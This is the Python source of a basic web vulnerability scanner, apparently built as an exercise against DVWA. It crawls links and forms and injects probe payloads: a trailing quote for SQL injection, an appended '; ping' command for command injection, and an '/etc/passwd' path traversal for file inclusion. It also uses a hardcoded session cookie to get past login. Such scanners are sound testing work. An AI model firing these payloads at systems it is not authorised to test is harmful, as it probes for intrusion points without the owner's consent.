import requests
import validators
import urllib.parse as urlparse
from enum import Enum
from bs4 import BeautifulSoup

class VulnerabilityType(Enum):
    SqlInjection = 1
    OSCommandInjection = 2
    LFInclusion = 3
	
class Constants:
    Intro = "\n[i] Analyzing page at url: {0}\n"
    CurrentVulnerabilityScan = "\n[i] Scanning for {0} vulnerabilities..."
    VulnerabilityFound = "[+] Vulnerability found\n\tUrl {0}\n\tParameter: {1}\n\tHttpMethod: {2} "
    VulnerabilityNotFound = "[-] Could not find vulnerabilities of type {0}"
    Conclusion = "\n[i] Analysis finished. {0} vulnerabilities found and {1} injection points"
    
    SqlInjectUrl = "{0}?{1}={2}'"
    SqlInjectPosMsg = "error in your SQL syntax"

    OSCmdInjectUrl = "{0}?{1}={2}; ping -c 1 127.0.0.1"
    OSCmdInjectPayload = "; ping -c 1 127.0.0.1"
    OSCmdInjectPosMsg = "PING 127.0.0.1"

    LFInclusionUrl = "{0}?{1}={2}"
    LFInclusionPayload = "../../../../../../../etc/passwd"
    LFInclusionPosMsg = "root:x:0:0:root"

class Utils:

    @staticmethod
    def GetQueryStrings(url):
        queryStrings = []
        if not url:
            return queryStrings

        urlComponents = urlparse.urlparse(url)
        for x,y in urlparse.parse_qsl(urlComponents.query):
            queryStrings.append((x,y))

        return queryStrings

    @staticmethod
    def GetAbsoluteUrl(rootUrl, url, host, stripQueryString):
        if not url or not rootUrl:
            return ""

        if url == "#":
            return rootUrl

        if url.startswith("#"):
            return ""

        returnUrl = url
        if stripQueryString and url.find("?") > -1:
            returnUrl = url.split('?')[0]
          
        returnUrl = urlparse.urljoin(rootUrl, returnUrl)

        #scan only urls from sitemap
        if returnUrl.startswith(host):
            return returnUrl
        else:
            return ""

    @staticmethod
    def AddQueryStringToUrl(url, queryStrings):
        if not url:
            return ""

        if not queryStrings:
            return url

        currentQueryStrings = Utils.GetQueryStrings(url)

        #remove query string duplicates
        for currQueryString in currentQueryStrings:
            queryStrings.pop(currQueryString[0], None)

        return url + ("?" if not "?" in url else "&") + "&".join(['%s=%s' % (key, value) for key,value in queryStrings.items()])

class Scanner:
	
    def __init__(self, url):
        
        self.injectionPointsCount = 0
        self.vulnerabilitiesCount = 0
        self.url = url
        self.host = "{0.scheme}://{0.netloc}".format(urlparse.urlparse(url))
        if url.find("?") > -1:
            self.baseUrl = url.split('?')[0]
        else:
            self.baseUrl = url

        #add cookie to bypass auth on this site
        self.cookie = {}
        if url.find("/dvwa/") > -1:
            #default cookie value - taken from browser
            cookieValue = '27ffd49b27d9376d27d1bc97bb1b2b0f'
            addCustomCookieValue = input("Do you want to provide an authentication cookie? If not, the default cookie will be used (y/n)\n")
            if addCustomCookieValue == 'y':
                cookieValue = input('Auth cookie value: ')
            self.cookie = {'PHPSESSID': cookieValue, 'security' : 'low'}

    def Scan(self):

        print(Constants.Intro.format(self.url))

        self.DetectInjectionPoints()

        self.AnalyzeSqlInjection()
        self.AnalyzeOSCommandInjection()
        self.AnalyzeLFInclusion()

        print(Constants.Conclusion.format(self.vulnerabilitiesCount, self.injectionPointsCount))

    def DetectInjectionPoints(self):

        session = requests.Session()
        response = session.get(self.url, cookies=self.cookie)
        soup = BeautifulSoup(response.text, 'html.parser')

        #dictionary of hrefs and associated query strings
        #used dictionary to easily avoid self refferences in page
        self.urls = {}
        
        #list of forms
        #elements are Tuple<action, method, inputs[]>
        self.forms = []

        #self.url query strings
        tempQueryStrings = Utils.GetQueryStrings(self.url)
        if tempQueryStrings:
            self.urls[self.baseUrl] = dict(tempQueryStrings)
        
        #refferenced hrefs query strings
        for aTag in soup.find_all('a'):
            url = str(aTag.get('href'))
            baseUrl = Utils.GetAbsoluteUrl(self.baseUrl, url, self.host, True)
            if not baseUrl:
                continue

            #save refferences urls and associated query strings
            tempQueryStrings = Utils.GetQueryStrings(url)
            if not tempQueryStrings:
                continue

            if not baseUrl in self.urls:
                self.urls[baseUrl] = dict(tempQueryStrings)
            else:
                for queryString in tempQueryStrings:
                    if not queryString[0] in self.urls[baseUrl]:
                        self.urls[baseUrl].update({queryString[0] : queryString[1]})

        #forms
        for form in soup.find_all("form"):
            url = str(form.get('action'))
            absoluteUrl = Utils.GetAbsoluteUrl(self.baseUrl, url, self.host, False)
            if not absoluteUrl:
                continue

            formElement = (absoluteUrl, str(form.get('method')).upper(), [])         
            for input in form.find_all("input"):
                inputName = input.get('name')
                if inputName:
                    formElement[2].append(inputName)
            #add only forms with proper input elements
            if formElement[2]:
                self.forms.append(formElement)

    def AnalyzeSqlInjection(self):
        
        print(Constants.CurrentVulnerabilityScan.format(VulnerabilityType.SqlInjection.name))
        session = requests.Session()
        canSqlInject = False
        
        #HREFS
        for url, queryParams in self.urls.items():
            for key, value in queryParams.items():
                maliciousUrl = Constants.SqlInjectUrl.format(url, key, value)
                response = session.get(url = maliciousUrl, cookies = self.cookie)
                if Constants.SqlInjectPosMsg in response.text in response.text:
                    print(Constants.VulnerabilityFound.format(maliciousUrl, key, "GET"))
                    self.injectionPointsCount+=1
                    canSqlInject = True
      
        #FORMS
        for form in self.forms:
            if form[1] == 'GET':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + '\''
                    maliciousUrl = Utils.AddQueryStringToUrl(form[0], payload)
                    response = session.get(url = maliciousUrl, cookies = self.cookie)
                    if Constants.SqlInjectPosMsg in response.text in response.text:
                        print(Constants.VulnerabilityFound.format(maliciousUrl, input, "GET"))
                        self.injectionPointsCount+=1
                        canSqlInject = True
            elif form[1] == 'POST':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + '\''
                    response = session.post(url = form[0], data = payload, cookies = self.cookie)
                    if Constants.SqlInjectPosMsg in response.text in response.text:
                        print(Constants.VulnerabilityFound.format(form[0], input, "POST"))
                        self.injectionPointsCount+=1
                        canSqlInject = True

        if canSqlInject is False:
            print(Constants.VulnerabilityNotFound.format(VulnerabilityType.SqlInjection.name))
        else:
            self.vulnerabilitiesCount+=1
    def AnalyzeOSCommandInjection(self):

        print(Constants.CurrentVulnerabilityScan.format(VulnerabilityType.OSCommandInjection.name))  
        session = requests.Session()
        canOSCmdInject = False

        #HREFS
        for url, queryParams in self.urls.items():
            for key, value in queryParams.items():
                maliciousUrl = Constants.OSCmdInjectUrl.format(url, key, value)
                response = session.get(url = maliciousUrl, cookies = self.cookie)
                if Constants.OSCmdInjectPosMsg in response.text:
                    print(Constants.VulnerabilityFound.format(maliciousUrl, key, "GET"))
                    self.injectionPointsCount+=1
                    canOSCmdInject = True

        #FORMS
        for form in self.forms:
            if form[1] == 'GET':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + Constants.OSCmdInjectPayload
                    maliciousUrl = Utils.AddQueryStringToUrl(form[0], payload)
                    response = session.get(url = maliciousUrl, cookies = self.cookie)
                    if Constants.OSCmdInjectPosMsg in response.text:
                        print(Constants.VulnerabilityFound.format(maliciousUrl, input, "GET"))
                        self.injectionPointsCount+=1
                        canOSCmdInject = True
            elif form[1] == 'POST':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + Constants.OSCmdInjectPayload
                    response = session.post(url = form[0], data = payload, cookies = self.cookie)
                    if Constants.OSCmdInjectPosMsg in response.text:
                        print(Constants.VulnerabilityFound.format(form[0], input, "POST"))
                        self.injectionPointsCount+=1
                        canOSCmdInject = True

        if canOSCmdInject is False:
            print(Constants.VulnerabilityNotFound.format(VulnerabilityType.OSCommandInjection.name))
        else:
            self.vulnerabilitiesCount+=1

    def AnalyzeLFInclusion(self):

        print(Constants.CurrentVulnerabilityScan.format(VulnerabilityType.LFInclusion.name))
        session = requests.Session()
        canLFInclude = False

        #HREFS
        for url, queryParams in self.urls.items():
            for key in queryParams:
                maliciousUrl = Constants.LFInclusionUrl.format(url, key, Constants.LFInclusionPayload)
                response = session.get(url = maliciousUrl, cookies = self.cookie)
                if Constants.LFInclusionPosMsg in response.text:
                    print(Constants.VulnerabilityFound.format(maliciousUrl, key, "GET"))
                    self.injectionPointsCount+=1
                    canLFInclude = True
        #FORMS
        for form in self.forms:
            if form[1] == 'GET':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + Constants.OSCmdInjectPayload
                    maliciousUrl = Utils.AddQueryStringToUrl(form[0], payload)
                    response = session.get(url = maliciousUrl, cookies = self.cookie)
                    if Constants.LFInclusionPosMsg in response.text:
                        print(Constants.VulnerabilityFound.format(maliciousUrl, input, "GET"))
                        self.injectionPointsCount+=1
                        canLFInclude = True
            elif form[1] == 'POST':
                for input in form[2]:
                    payload = {item: '1' for item in form[2]}
                    payload[input] = payload[input] + Constants.LFInclusionPayload
                    response = session.post(url = form[0], data = payload, cookies = self.cookie)
                    if Constants.LFInclusionPosMsg in response.text:
                        print(Constants.VulnerabilityFound.format(form[0], input, "POST"))
                        self.injectionPointsCount+=1
                        canLFInclude = True

        if canLFInclude is False:
            print(Constants.VulnerabilityNotFound.format(VulnerabilityType.LFInclusion.name))
        else:
            self.vulnerabilitiesCount+=1

def main():
    while True:
        url = input("Please enter the url you want scanned.\nType exit to terminate application\n\nUrl: ")
        if url == "exit":
            break
        
        if not validators.url(url):
            print('The url provided is not valid\n')
            continue

        scanner = Scanner(url)
        scanner.Scan()

        doItAgain = input("\nDo you want to scan another url? (y/n)\n")
        if doItAgain == "n":
            break

if __name__ == "__main__":
    main()